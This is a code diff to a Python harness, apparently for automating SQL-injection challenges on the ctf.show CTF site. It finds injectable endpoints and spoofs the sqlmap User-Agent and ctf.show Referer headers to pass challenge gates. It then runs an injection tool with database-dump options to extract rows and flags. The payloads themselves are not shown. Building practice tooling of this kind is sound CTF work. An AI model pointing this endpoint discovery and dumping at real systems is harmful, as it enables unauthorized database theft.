@@ -33,12 +33,12 @@ FALLBACK_ACTION_RE = re.compile(r'action="([^"]+\.php[^"]*)"')
 INPUT_RE = re.compile(r'<input[^>]*name="([^"]+)"', re.I)
 
 
-def http_get(url: str, cookie: str) -> tuple[int, str]:
+def http_get(url: str, cookie: str, headers: dict | None = None) -> tuple[int, str]:
     import urllib.request
-    req = urllib.request.Request(url, headers={
-        "Cookie": "session=" + cookie,
-        "User-Agent": "Mozilla/5.0 AutoSQLi-battle",
-    })
+    h = {"Cookie": "session=" + cookie,
+         "User-Agent": "Mozilla/5.0 AutoSQLi-battle"}
+    h.update(headers or {})
+    req = urllib.request.Request(url, headers=h)
     try:
         with urllib.request.urlopen(req, timeout=25) as r:
             return r.status, r.read().decode("utf-8", "replace")
@@ -46,14 +46,54 @@ def http_get(url: str, cookie: str) -> tuple[int, str]:
         return e.code, e.read().decode("utf-8", "replace")
 
 
-def _result(url, param, method, html, fields=None):
+def _gate_headers(body: str, headers: dict) -> dict:
+    """ctf.show sqlmap 模块常见网关：先查 UA，再查 Referer。
+
+    返回的提示文案很直白：「不使用sqlmap是没有灵魂的」→ 要求 UA 含 sqlmap；
+    「你都不是从ctf.show来的」→ 要求 Referer 指向 ctf.show。
+    """
+    h = dict(headers)
+    if "sqlmap" in body and "User-Agent" not in h:
+        h["User-Agent"] = "sqlmap/1.5.12#stable (http://sqlmap.org)"
+    if "ctf.show" in body and "Referer" not in h:
+        h["Referer"] = "https://ctf.show/"
+    return h
+
+
+def probe_json(url: str, method: str, param: str, cookie: str,
+               headers: dict) -> tuple[bool, dict, str]:
+    """探测接口是否返回 {"code":..}；被 UA/Referer 网关拦住时自动补头重试。"""
+    for _ in range(3):
+        if method.upper() == "POST":
+            s, body = http_post(url, {param: "1"}, cookie, headers)
+        else:
+            s, body = http_get(f"{url}?{param}=1", cookie, headers)
+        if s == 200 and body.lstrip().startswith('{"code"'):
+            return True, headers, body
+        new = _gate_headers(body, headers)
+        if new == headers:
+            break
+        headers = new
+    return False, headers, ""
+
+
+def _has_data(body: str) -> bool:
+    """接口是否真的查到了行（web202 的 GET 恒返回空 data，不能只看 JSON 前缀）。"""
+    import json as _json
+    try:
+        return bool(_json.loads(body).get("data"))
+    except Exception:      # noqa: BLE001
+        return False
+
+
+def _result(url, param, method, html, fields=None, headers=None):
     sm = SQL_RE.search(html)
     fm = re.search(r"function\s+waf\s*\([^)]*\)\s*\{([^}]{0,300})\}", html) \
         or re.search(r"preg_match\s*\([^\n]{0,180}", html)
     return {"url": url, "param": param, "method": method,
             "sql": sm.group(1) if sm else "",
             "filt": fm.group(0) if fm else "",
-            "fields": fields or {}}
+            "fields": fields or {}, "headers": headers or {}}
 
 
 def resolve_entry(base: str, name: str, cookie: str) -> dict:
@@ -106,19 +146,15 @@ def resolve_entry(base: str, name: str, cookie: str) -> dict:
         if js_url:
             # 很多题把接口写在 JS 的 $.ajax({url:'api/'}) 里，页面本身没有 form action
             cand2 = urllib.parse.urljoin(base + page, js_url.group(1))
-            probe = dict(fields)
-            probe[param] = "admin"
-            s3, body3 = http_post(cand2, probe, cookie)
-            if s3 == 200 and body3.lstrip().startswith('{"code"'):
-                return _result(cand2, param, "POST", html, fields)
+            ok, hdrs, _ = probe_json(cand2, "POST", param, cookie, {})
+            if ok:
+                return _result(cand2, param, "POST", html, fields, hdrs)
         if not am:
             # 没有 form action（PHP 自提交页）：直接打页面本身
-            probe = dict(fields)
-            probe[param] = "1"
-            s2, body2 = http_post(base + page, probe, cookie)
-            if s2 == 200 and len(body2) > 50 and "404" not in body2[:200]:
-                return _result(base + page, param, src_method, html, fields)
-            last_err = f"{page} 自提交页探测失败（{s2}）"
+            ok, hdrs, _ = probe_json(base + page, src_method, param, cookie, {})
+            if ok:
+                return _result(base + page, param, src_method, html, fields, hdrs)
+            last_err = f"{page} 自提交页探测失败"
             continue
         action = urllib.parse.urljoin(base + page, am.group(1) or (base + page))
         # 页面写的 action 不一定真实可用（web174 写 api/v2.php，真接口是 api/v4.php），
@@ -126,30 +162,38 @@ def resolve_entry(base: str, name: str, cookie: str) -> dict:
         cands = [action, urllib.parse.urljoin(action, "./"), base + page]
         for n in ([guess - 1, guess, guess + 1, guess + 2] if guess else []):
             cands.append(urllib.parse.urljoin(base, f"api/v{n}.php"))
-        real = ""
+        real, hdrs, method, fallback = "", {}, "GET", None
         for cand in dict.fromkeys(cands):
             if not cand:
                 continue
-            s2, body2 = http_get(f"{cand}?{param}=1", cookie)
-            if s2 == 200 and body2.lstrip().startswith('{"code"'):
-                real = cand
+            for m in ("GET", "POST"):
+                ok, h, body = probe_json(cand, m, param, cookie, {})
+                if ok and _has_data(body):
+                    real, hdrs, method = cand, h, m
+                    break
+                if ok and fallback is None:
+                    fallback = (cand, m, h)
+            if real:
                 break
+        if not real and fallback:
+            real, method, hdrs = fallback[0], fallback[1], fallback[2]
         if not real:
             last_err = f"{page} 的 action {action} 及候选接口均未返回 JSON"
             continue
-        return _result(real, param, "GET", html, fields)
+        return _result(real, param, method, html, fields, hdrs)
     raise RuntimeError(f"定位入口失败：{last_err}")
 
 
-def http_post(url: str, data: dict, cookie: str) -> tuple[int, str]:
+def http_post(url: str, data: dict, cookie: str,
+              headers: dict | None = None) -> tuple[int, str]:
     import urllib.parse as up
     import urllib.request
     body = up.urlencode(data).encode()
-    req = urllib.request.Request(url, data=body, headers={
-        "Cookie": "session=" + cookie,
-        "User-Agent": "Mozilla/5.0 AutoSQLi-battle",
-        "Content-Type": "application/x-www-form-urlencoded",
-    })
+    h = {"Cookie": "session=" + cookie,
+         "User-Agent": "Mozilla/5.0 AutoSQLi-battle",
+         "Content-Type": "application/x-www-form-urlencoded"}
+    h.update(headers or {})
+    req = urllib.request.Request(url, data=body, headers=h)
     try:
         with urllib.request.urlopen(req, timeout=25) as r:
             return r.status, r.read().decode("utf-8", "replace")
@@ -157,14 +201,16 @@ def http_post(url: str, data: dict, cookie: str) -> tuple[int, str]:
         return e.code, e.read().decode("utf-8", "replace")
 
 
-def stream_cli(url: str, param: str, method: str, fields: dict, budget: int,
-               verbose: bool, log_path: str) -> tuple[int, str]:
+def stream_cli(url: str, param: str, method: str, fields: dict, headers: dict,
+               budget: int, verbose: bool, log_path: str) -> tuple[int, str]:
     cmd = [sys.executable, "-u", "-m", "autosqli.cli", "-u", url, "-p", param,
            "--dump", "--fast", "--max-seconds", str(budget), "--timeout", "12",
            "--workers", "8", "--max-rows", "60"]
     if method.upper() == "POST":
         data = [f"{param}=1"] + [f"{k}={v}" for k, v in (fields or {}).items()]
         cmd += ["--method", "POST", "--data", *data]
+    if headers:
+        cmd += ["--header", *[f"{k}={v}" for k, v in headers.items()]]
     keep = re.compile(r"\[进度\]|注入点|指纹:|\[FLAG\]|\[WARN\]|\[ERROR\]|通道|请求数|"
                       r"脱库结果|已过滤|✗|★")
     out, t0 = [], time.time()
@@ -232,14 +278,15 @@ def main(argv=None):
         return 2
     target, param, method = res["url"], res["param"], res["method"]
     print(f"[{c['name']}] 入口 {method} {target}  参数 {param}"
-          + (f"  附带字段 {res['fields']}" if res["fields"] else ""), flush=True)
+          + (f"  附带字段 {res['fields']}" if res["fields"] else "")
+          + (f"  请求头 {res['headers']}" if res["headers"] else ""), flush=True)
     if res["sql"]:
         print(f"[{c['name']}] 源码 {res['sql'][:150]}", flush=True)
     if res["filt"]:
         print(f"[{c['name']}] 过滤 {res['filt'][:150]}", flush=True)
 
-    rc, out = stream_cli(target, param, method, res["fields"], args.budget,
-                         args.verbose, log_path)
+    rc, out = stream_cli(target, param, method, res["fields"], res["headers"],
+                         args.budget, args.verbose, log_path)
     flags = list(dict.fromkeys(FLAG_RE.findall(out)))
     tech = re.search(r"通道: (\w+)", out)
     reqs = re.search(r"请求数: (\d+)", out)
